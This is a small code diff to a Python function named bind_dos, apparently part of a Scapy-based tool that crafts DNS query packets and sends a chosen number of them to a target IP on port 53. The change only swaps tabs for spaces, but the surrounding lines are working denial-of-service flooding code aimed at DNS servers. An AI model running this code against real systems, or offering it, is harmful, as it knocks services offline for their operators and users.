@@ -16,7 +16,7 @@ def bind_dos():
     template = IP(dst=values.get("target_ip"))/UDP()/DNS(rd=1,qd=DNSQR(qtype=values.get("query_type"),qname=values.get("query_name")))
     pktAmt = int(values.get("quantity"))
     for pktNum in range(0,pktAmt):
-    	bind.extend(template)
-    	bind[pktNum][UDP].dport = 53
+        bind.extend(template)
+        bind[pktNum][UDP].dport = 53
     send(bind)
     print("Packets sent")
